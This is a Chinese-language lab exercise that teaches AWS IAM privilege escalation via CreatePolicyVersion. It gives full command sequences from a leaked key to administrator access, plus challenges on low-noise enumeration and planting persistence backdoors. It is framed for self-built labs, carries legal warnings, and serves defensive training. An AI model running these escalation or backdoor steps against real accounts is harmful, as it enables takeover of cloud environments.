# 練習 A — 低權限 credential → 枚舉 → 提權到 admin

> **注意：本練習需自架 lab，未在此實測。所有指令和輸出為預期行為（expected behavior）。**
> 未授權存取他人 AWS 資源違反電腦詐欺及濫用相關法規，多數國家為刑事犯罪。

## 背景與情境

你是紅隊（red team）成員。有人通報：某組織的開發機器人帳號 `dev-bot` 的 AWS access key 被意外 commit 到公開的 GitHub repo。GitHub secret scanning 已偵測到洩漏，但憑證尚未被撤銷（revoke）。

你的任務：評估這次憑證洩漏的衝擊半徑（impact radius）——憑證擁有的權限到底能讓攻擊者做什麼？

從外部看，這組 key 的 policy 名稱叫 `dev-s3-read`，名字很無害，看起來只有 S3 唯讀。但真的只有這樣嗎？

**模擬規則：**

- 整個練習在你自己擁有的 AWS 帳號或授權的 lab 環境中執行
- 目標是搞懂 `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion` 這條提權路徑的原理與手法
- 實際入侵他人 AWS 帳號是刑事犯罪，任何國家皆然

---

## 使用的 Lab 環境

三個選項，由推薦到自由度排列。

### 選項 1 — CloudGoat（最推薦）

Rhino Security Labs 維護的靶機框架，有現成的 IAM 提權場景。

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt

# 初始化（需要先設好 AWS credentials，建議用 aws configure）
./cloudgoat.py config profile default

# 建立 iam_privesc_by_rollback 場景
# 這個場景建立的 IAM user 正好有 CreatePolicyVersion 提權路徑
./cloudgoat.py create iam_privesc_by_rollback
```

CloudGoat 建完後會給你一組 access key，直接用它跑本練習的 Step 1–5。

拆除（teardown）：
```bash
./cloudgoat.py destroy iam_privesc_by_rollback
```

### 選項 2 — IAM Vulnerable（Terraform 方案）

BishopFox 的 Terraform 模組，建立多條提權路徑供練習。

```bash
git clone https://github.com/BishopFox/iam-vulnerable
cd iam-vulnerable
terraform init
terraform apply
```

`outputs` 會列出各個有趣的 IAM user 與其 credentials。找 `privesc-path-1` 之類的 output 開始玩。

### 選項 3 — 手動建立（DIY）

在自己的 AWS 帳號中手動建立場景。需要你有一個擁有 `iam:*` 的管理員帳號來做初始設定。

**第一步：建立受害憑證要附著的 policy（這是被提權的目標）**

先建立 `dev-s3-read` policy，目前只有 S3 唯讀：

```bash
# 存成 dev-s3-read-v1.json
cat > /tmp/dev-s3-read-v1.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket",
                "s3:GetBucketLocation"
            ],
            "Resource": "*"
        }
    ]
}
EOF

aws iam create-policy \
  --policy-name dev-s3-read \
  --policy-document file:///tmp/dev-s3-read-v1.json \
  --description "S3 read-only for dev bot"
# 記下輸出的 Policy ARN，格式：arn:aws:iam::123456789012:policy/dev-s3-read
```

**第二步：建立 dev-bot 這個 IAM user 以及它「看起來無害」的 policy**

這個 policy 允許枚舉 IAM，並且對 `dev-s3-read` 這個 policy 有 `CreatePolicyVersion` + `SetDefaultPolicyVersion`——這就是提權路徑。把 `123456789012` 換成你自己的帳號 ID。

```bash
cat > /tmp/dev-bot-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "SelfInspection",
            "Effect": "Allow",
            "Action": [
                "iam:GetUser",
                "iam:ListUsers",
                "iam:ListRoles",
                "iam:ListPolicies",
                "iam:GetPolicy",
                "iam:GetPolicyVersion",
                "iam:ListAttachedUserPolicies",
                "iam:ListUserPolicies",
                "sts:GetCallerIdentity"
            ],
            "Resource": "*"
        },
        {
            "Sid": "PrivescPath",
            "Effect": "Allow",
            "Action": [
                "iam:CreatePolicyVersion",
                "iam:SetDefaultPolicyVersion"
            ],
            "Resource": "arn:aws:iam::123456789012:policy/dev-s3-read"
        }
    ]
}
EOF

# 建立 dev-bot user
aws iam create-user --user-name dev-bot

# 建立並附加 bot 自己的 policy
aws iam create-policy \
  --policy-name dev-bot-permissions \
  --policy-document file:///tmp/dev-bot-policy.json

aws iam attach-user-policy \
  --user-name dev-bot \
  --policy-arn arn:aws:iam::123456789012:policy/dev-bot-permissions

# 同時把 dev-s3-read 也附上（這是要被提權的那個 policy）
aws iam attach-user-policy \
  --user-name dev-bot \
  --policy-arn arn:aws:iam::123456789012:policy/dev-s3-read

# 建立 access key
aws iam create-access-key --user-name dev-bot
# 輸出的 AccessKeyId 和 SecretAccessKey 就是「洩漏的憑證」
```

---

## 任務規格

**給定條件：**

- 洩漏的 Access Key ID：`AKIAIOSFODNN7EXAMPLE`
- 洩漏的 Secret Access Key：`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
- 目標帳號 ID：`123456789012`

（DIY 場景中，用 `aws iam create-access-key` 輸出的真實 key 替換上面的假值。）

**目標：**

從 `dev-bot` 這組低權限 credentials 出發，達成 `AdministratorAccess`——即能執行 `aws iam list-users`、`aws iam create-user` 等管理操作而不遭遇 `AccessDenied`。

**交付物：**

1. 你畫出（或文字描述）的 permission graph，標明提權路徑
2. 具體找到的提權 action 與目標 resource ARN
3. 提權後 `aws iam list-users --profile dev-bot` 成功的截圖或輸出

---

## 期望輸出

以下是每個步驟預期看到的結果。

**Step 1 — 驗身分**

```json
{
    "UserId": "AIDAEXAMPLE1234567890",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/dev-bot"
}
```

**Step 2 — 枚舉發現的權限**

enumerate-iam 工具的輸出（或手動枚舉整理後的清單）：

```
[+] Confirmed permissions for dev-bot:
    sts:GetCallerIdentity
    iam:GetUser
    iam:ListUsers
    iam:ListRoles
    iam:ListPolicies
    iam:GetPolicy
    iam:GetPolicyVersion
    iam:ListAttachedUserPolicies
    iam:ListUserPolicies
[+] Scoped permissions (on specific resource):
    iam:CreatePolicyVersion  -> arn:aws:iam::123456789012:policy/dev-s3-read
    iam:SetDefaultPolicyVersion -> arn:aws:iam::123456789012:policy/dev-s3-read
```

`iam:CreatePolicyVersion` 出現就是危險訊號。

**Step 3 — 查看 dev-s3-read 現有版本**

```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:GetObject",
                        "s3:ListBucket",
                        "s3:GetBucketLocation"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-15T08:00:00Z"
    }
}
```

**Step 4 — 建立惡意新版本**

```json
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-15T09:00:00Z"
    }
}
```

`IsDefaultVersion: true` 表示 `--set-as-default` 已生效，v2 立刻成為 active 版本。

**Step 5 — 驗證提權成功**

```bash
$ aws iam list-users --profile dev-bot
{
    "Users": [
        {
            "Path": "/",
            "UserName": "admin-user",
            "UserId": "AIDAEXAMPLEADMIN",
            "Arn": "arn:aws:iam::123456789012:user/admin-user",
            "CreateDate": "2023-06-01T00:00:00Z"
        },
        {
            "Path": "/",
            "UserName": "dev-bot",
            "UserId": "AIDAEXAMPLE1234567890",
            "Arn": "arn:aws:iam::123456789012:user/dev-bot",
            "CreateDate": "2024-01-15T08:00:00Z"
        }
    ]
}
```

提權前這個指令會回傳 `AccessDenied`，提權後直接列出所有 user。

---

## 實作步驟

### Step 1 — 驗身分

設好 credentials profile，確認憑證有效且對應到 dev-bot。

```bash
aws configure --profile dev-bot
# 輸入 Access Key ID: AKIAIOSFODNN7EXAMPLE
# 輸入 Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Region: ap-northeast-1（或你的 lab region）
# Output format: json

aws sts get-caller-identity --profile dev-bot
```

確認回傳：
- `Account` 是 `123456789012`
- `Arn` 包含 `user/dev-bot`

如果收到 `InvalidClientTokenId` 或 `AuthFailure`，憑證本身就是壞的——LAb 設定有問題，先排查。

### Step 2 — 枚舉權限

**方案 A：enumerate-iam（快）**

```bash
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

python3 enumerate-iam.py \
  --access-key AKIAIOSFODNN7EXAMPLE \
  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  --region ap-northeast-1
```

這個工具暴力嘗試數百個 IAM action，把回傳 non-AccessDenied 的都記錄下來。噪音多但全面。

**方案 B：CloudFox（較精準）**

```bash
# 安裝：https://github.com/BishopFox/cloudfox
cloudFox aws --profile dev-bot permissions
cloudFox aws --profile dev-bot iam-simulator
```

**方案 C：手動枚舉（最安靜，模擬低調攻擊）**

```bash
# 看自己是誰
aws iam get-user --profile dev-bot

# 看附了哪些 managed policy
aws iam list-attached-user-policies \
  --user-name dev-bot \
  --profile dev-bot

# 看有沒有 inline policy
aws iam list-user-policies \
  --user-name dev-bot \
  --profile dev-bot

# 對每個 policy 取得文件
aws iam get-policy \
  --policy-arn arn:aws:iam::123456789012:policy/dev-bot-permissions \
  --profile dev-bot

aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/dev-bot-permissions \
  --version-id v1 \
  --profile dev-bot
```

**重點：** 把所有確認的 action 整理成清單，特別標記：
- 任何 `iam:*PolicyVersion`
- 任何 `iam:Attach*`
- 任何 `iam:PassRole`
- 任何 `iam:CreateAccessKey`

這四類是 IAM 提權的主要 primitive（原語）。

### Step 3 — 畫出 permission graph

在紙上或文字檔中畫出以下結構：

```
dev-bot
├── dev-bot-permissions policy
│   ├── [READ ONLY] iam:GetUser, ListUsers, ListRoles, ListPolicies
│   ├── [READ ONLY] iam:GetPolicy, GetPolicyVersion
│   ├── [READ ONLY] iam:ListAttachedUserPolicies, ListUserPolicies
│   ├── [READ ONLY] sts:GetCallerIdentity
│   └── [DANGER] iam:CreatePolicyVersion  ──► dev-s3-read (scoped)
│              iam:SetDefaultPolicyVersion ──► dev-s3-read (scoped)
│
└── dev-s3-read policy（目前版本 v1）
    └── [s3:GetObject, s3:ListBucket] — 無害
        但 dev-bot 可以建立 v2 並設為 default！
        v2 如果是 Action:* Resource:* → 完全提權
```

`CreatePolicyVersion` 的危險在於：你不需要修改現有版本，只需建立新版本並把它設為 default。AWS policy 最多允許 5 個版本並存（`LimitExceeded` 在第 6 個），舊版本不會自動刪除。

### Step 4 — 確認利用路徑

先看清楚 `dev-s3-read` 目前的狀態：

```bash
# 取得 policy metadata（包含目前的 DefaultVersionId）
aws iam get-policy \
  --policy-arn arn:aws:iam::123456789012:policy/dev-s3-read \
  --profile dev-bot

# 取得目前 default 版本的內容（確認它確實是無害的 S3 read）
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/dev-s3-read \
  --version-id v1 \
  --profile dev-bot
```

確認：
1. `dev-bot` 附著了 `dev-s3-read`（枚舉 `list-attached-user-policies` 時看到）
2. `dev-bot` 對 `dev-s3-read` 有 `CreatePolicyVersion` + `SetDefaultPolicyVersion`
3. 如果 v2 是 `Action:* Resource:*`，`dev-bot` 就會繼承那個 v2

這條路成立。

### Step 5 — 執行提權並驗證

**建立惡意 policy 文件：**

```bash
cat > /tmp/admin-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF
```

`"Action": "*"` 搭配 `"Resource": "*"` 等同於 AWS 的 `AdministratorAccess` managed policy。

**建立新版本並立刻設為 default：**

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/dev-s3-read \
  --policy-document file:///tmp/admin-policy.json \
  --set-as-default \
  --profile dev-bot
```

`--set-as-default` 讓新版本在建立的瞬間成為 active 版本，不需要額外跑一次 `set-default-policy-version`。

**驗證提權成功：**

```bash
# 提權前應該是 AccessDenied，提權後應該列出所有 user
aws iam list-users --profile dev-bot

# 身分沒變，但現在有 admin 權限
aws sts get-caller-identity --profile dev-bot

# 進一步驗證：嘗試建立新的 IAM user（謹慎，lab 環境才做）
# aws iam create-user --user-name test-pwned --profile dev-bot
```

`list-users` 回傳 user 列表而非 `AccessDenied` = 提權成功。

---

## 完整參考解答

**寫完再看！先跑完 Step 1–5，卡住再看解答。**

<details>
<summary>點開參考解答（含 lab 建立與完整指令序列）</summary>

### 完整利用序列（dev-bot 的角度）

DIY lab 建立步驟見「使用的 Lab 環境 → 選項 3」，這裡直接從拿到 credentials 之後開始。

```bash
# 0. 設好 profile
aws configure --profile dev-bot
# 填入 create-access-key 輸出的 key

# 1. 驗身分
aws sts get-caller-identity --profile dev-bot

# 2. 找附著的 policy
aws iam list-attached-user-policies \
  --user-name dev-bot --profile dev-bot

# 3. 讀取 dev-bot-permissions 的內容
ACCOUNT=$(aws sts get-caller-identity \
  --profile dev-bot --query Account --output text)

aws iam get-policy-version \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-bot-permissions" \
  --version-id v1 \
  --profile dev-bot
# 在 Statement 裡找到 CreatePolicyVersion → 確認提權路徑

# 4. 確認 dev-s3-read 目前內容無害
aws iam get-policy-version \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read" \
  --version-id v1 \
  --profile dev-bot

# 5. 建立惡意版本
cat > /tmp/admin-policy.json << 'EOF'
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
    }]
}
EOF

aws iam create-policy-version \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read" \
  --policy-document file:///tmp/admin-policy.json \
  --set-as-default \
  --profile dev-bot

# 6. 驗證提權
aws iam list-users --profile dev-bot
# 成功 = 提權完成
```

### 清理（還原 lab）

```bash
# 用管理員帳號執行
ACCOUNT=$(aws sts get-caller-identity --query Account --output text)

# 刪除 v2（惡意版本），讓 v1 恢復為 default
aws iam set-default-policy-version \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read" \
  --version-id v1

aws iam delete-policy-version \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read" \
  --version-id v2

# 若要完全拆除
aws iam detach-user-policy \
  --user-name dev-bot \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-bot-permissions"
aws iam detach-user-policy \
  --user-name dev-bot \
  --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read"

# 刪除 access key（先查 key ID）
KEY_ID=$(aws iam list-access-keys \
  --user-name dev-bot --query 'AccessKeyMetadata[0].AccessKeyId' --output text)
aws iam delete-access-key --user-name dev-bot --access-key-id $KEY_ID

aws iam delete-user --user-name dev-bot
aws iam delete-policy --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-bot-permissions"
aws iam delete-policy --policy-arn "arn:aws:iam::${ACCOUNT}:policy/dev-s3-read"
```

### 為什麼 CreatePolicyVersion 這麼危險

AWS policy 的版本機制允許一個 policy 存在最多 5 個版本（v1–v5）。`DefaultVersion` 決定 IAM 實際套用哪個版本——切換 default 是原子操作（atomic），沒有空窗期。

`CreatePolicyVersion` 允許你建立一個全新版本，`SetDefaultPolicyVersion` 允許你把任意版本切成 active。兩個 action 合起來 = 對那個 policy 的完全寫入控制。

被 scope 到特定 policy ARN 的限制（`"Resource": "arn:..."` 而非 `*`）只是縮小了攻擊面，不是消除了風險——只要那個 policy 附著在自己身上，照樣提權。

</details>

---

## 測試與檢查表

跑完之後，逐項確認：

- [ ] `sts:GetCallerIdentity` 確認回傳 `user/dev-bot`，Account 正確
- [ ] 枚舉（enumerate-iam 或手動）找到 `iam:CreatePolicyVersion` 列在 dev-bot 的 actions 中
- [ ] 已記錄 `CreatePolicyVersion` 的 Resource scope（應為 `dev-s3-read` 的 ARN，不是 `*`）
- [ ] 畫出或寫出完整提權路徑（dev-bot → CreatePolicyVersion on dev-s3-read → v2 is `Action:*` → admin）
- [ ] `create-policy-version --set-as-default` 成功執行，回傳帶有 `VersionId: v2` 的 response
- [ ] `aws iam list-users --profile dev-bot` 回傳 user 列表而非 `AccessDenied`
- [ ] 已執行清理：刪除 v2、恢復 v1 為 default（或直接拆除整個 lab）

---

## 延伸挑戰

### 挑戰 1 — 換路徑

把 `iam:CreatePolicyVersion` 從 dev-bot-permissions 移除。現在這條路死了，但如果 dev-bot 有 `iam:PassRole` 並且帳號裡有某個 Lambda function 綁著有趣的 execution role，能找到替代路徑嗎？

提示：`PassRole` + Lambda `CreateFunction` + `InvokeFunction` 是另一條高頻提權路。

### 挑戰 2 — 靜音枚舉

enumerate-iam 會對每個 action 打一次 API call，CloudTrail 會留下幾百條 `AccessDenied` 記錄，SOC 很容易發現。

只用 `iam:Get*` / `iam:List*`（這些通常是允許的 read op），手動讀 policy 文件來找 privesc path——不觸發任何 non-read call。能在不跑自動化工具的情況下，僅靠讀 policy JSON 找出同一條路嗎？

這是實際紅隊操作的節奏：噪音最小化。

### 挑戰 3 — 提權後的持久化

提權成功後，`dev-bot` 的 policy 被組織修復（刪掉 v2、撤銷 CreatePolicyVersion）。如何在被踢出前留下後門，讓組織輪替 credentials 後你還能回來？

可能的方向：
- 建立另一個 IAM user 並存一組 key
- 設定 `aws_console_password` 讓 dev-bot 可以登入 Console
- 建立一個 assume-role 的 trust policy 讓外部帳號可以 STS assume

**注意：只在你自己的 lab 做這個，不要在不是你的環境留後門。**

### 挑戰 4 — CloudGoat 延伸場景

如果你用 CloudGoat 跑了 `iam_privesc_by_rollback`，接著試試 `cloud_breach_s3`：

```bash
./cloudgoat.py create cloud_breach_s3
```

這個場景從 public S3 bucket 找到 leaked credentials，再從那組 credentials 往 IAM 提權。完整鏈路跟本練習的情境（GitHub leak → IAM privesc）幾乎一模一樣，但起點從 IAM enumeration 換成了 storage layer。

---

## 自我檢核

完成後你應該能不靠任何資料回答：

- [ ] 枚舉 IAM 時，哪幾個 action 最值得優先找？（`PassRole`, `CreatePolicyVersion`, `AttachUserPolicy`, `CreateAccessKey`——找到任一個就有機會）
- [ ] `CreatePolicyVersion` + `SetDefaultPolicyVersion` 的提權原理是什麼？為什麼 scope 到特定 ARN 還是能提權？
- [ ] 如果你發現 `iam:AttachUserPolicy` 而不是 `iam:CreatePolicyVersion`，利用方式有什麼不同？
- [ ] CloudTrail 會記錄 `CreatePolicyVersion` 嗎？藍隊（blue team）應該設什麼告警規則來偵測這類操作？
- [ ] 能寫出從 `aws configure` 到 `aws iam list-users` 成功的完整指令序列（不看解答）？
- [ ] 我清楚這個練習需要在自架 lab 或授權環境中跑，不能對他人帳號使用

---

→ [Ch 9 S3 與儲存體安全：bucket misconfig 與 presigned URL](./09-s3-storage-security.md)
